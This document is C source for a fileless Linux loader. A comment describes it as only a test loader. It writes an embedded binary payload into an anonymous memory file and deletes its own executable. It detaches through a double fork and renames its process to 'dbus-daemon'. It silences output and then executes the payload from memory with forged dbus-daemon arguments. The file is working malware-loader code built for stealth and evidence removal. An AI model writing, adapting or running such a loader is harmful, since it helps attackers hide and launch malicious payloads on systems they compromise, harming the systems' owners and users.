/* Este es solo un cargador de prueba */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <signal.h>
#include <sys/prctl.h>

#ifndef PAYLOAD_LEN
#  error "loader_payload.h not included"
#endif

static int nax_memfd_create(const char *name, unsigned int flags) {
#ifdef __NR_memfd_create
    return (int)syscall(__NR_memfd_create, name, flags);
#else
    errno = ENOSYS; return -1;
#endif
}

int main(void) {
    /* 1. Write ELF into anonymous memfd */
    int fd = nax_memfd_create("", 0);
    if (fd < 0) {
#ifdef O_TMPFILE
        fd = open("/dev/shm", O_RDWR|O_TMPFILE|O_CLOEXEC, 0700);
        if (fd < 0) fd = open("/tmp", O_RDWR|O_TMPFILE|O_CLOEXEC, 0700);
#endif
        if (fd < 0) {
            fd = open("/dev/shm/.x", O_RDWR|O_CREAT|O_TRUNC, 0700);
            if (fd >= 0) unlink("/dev/shm/.x");
        }
        if (fd < 0) return 1;
    }

    const unsigned char *ptr = payload;
    size_t rem = PAYLOAD_LEN;
    while (rem > 0) {
        ssize_t w = write(fd, ptr, rem);
        if (w <= 0) { close(fd); return 1; }
        ptr += (size_t)w; rem -= (size_t)w;
    }

    {
        char self[4096] = {0};
        ssize_t n = readlink("/proc/self/exe", self, sizeof(self)-1);
        if (n > 0) { self[n] = '\0'; unlink(self); }
    }

    pid_t p1 = fork();
    if (p1 < 0) {
        goto do_exec;
    }
    if (p1 > 0) {
        signal(SIGCHLD, SIG_IGN);
        close(fd);
        _exit(0);
    }

    setsid();

    pid_t p2 = fork();
    if (p2 > 0) {
        close(fd);
        _exit(0);
    }
    if (p2 < 0) goto do_exec;

    {
        prctl(PR_SET_PDEATHSIG, 0, 0, 0, 0);  /* don't die when parent dies */
        prctl(PR_SET_NAME, "dbus-daemon", 0, 0, 0); /* rename process */

        int null_fd = open("/dev/null", O_RDWR);
        if (null_fd >= 0) {
            dup2(null_fd, 0);
            dup2(null_fd, 1);
            dup2(null_fd, 2);
            if (null_fd > 2) close(null_fd);
        }
        long maxfd = sysconf(_SC_OPEN_MAX);
        if (maxfd < 0) maxfd = 1024;
        for (int i = 3; i < (int)maxfd; i++)
            if (i != fd) close(i);
    }

do_exec:;
    char *exec_argv[] = { "/usr/bin/dbus-daemon", "--system", "--address=systemd:", "--nofork", "--nopidfile", "--systemd-activation", "--syslog-only", NULL };
    char *exec_envp[] = { NULL };

    {
        char fdpath[64];
        snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", fd);
        execve(fdpath, exec_argv, exec_envp);
    }
    fexecve(fd, exec_argv, exec_envp);

    close(fd);
    _exit(1);
}
